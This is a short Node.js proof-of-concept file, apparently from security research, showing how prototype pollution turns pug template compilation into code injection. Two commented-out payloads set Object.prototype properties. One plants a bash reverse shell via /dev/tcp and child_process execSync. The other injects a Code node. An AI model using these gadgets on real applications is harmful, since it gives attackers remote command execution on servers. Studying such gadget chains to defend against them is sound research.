pug = require("pug")

/* Payload Injection*/
// inject property to root prototype

// exp-1
// Object.prototype.block = {
//     type: "Text",
//     line: "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)"
// }

// exp-2
// Object.prototype['attrs'] = [];
// Object.prototype['attributeBlocks'] = [];
// Object.prototype['block'] = 
// { 
//   type: "Block",
//   nodes: [
//     {
//       type:"Tag",
//       name:"p",
//       block:{
//         type:"Block",
//         nodes:[
//           {
//             type:"Code",
//             val:"console.log('universal code injection!!!')",
//             block:{
//               type: "Block",
//               nodes:[
//                 {
//                   type: "Comment",
//                   val: "End the visiting node process"
//                 }
//               ]
//             }
//           },
//         ],
//       },
//     },
//   ]}

// for node-find-undefined
console.log("===========start===========")


const template = pug.compile(`h1= msg`);

// for node-find-undefined
console.log("===========end===========")

// console.log(template.toString());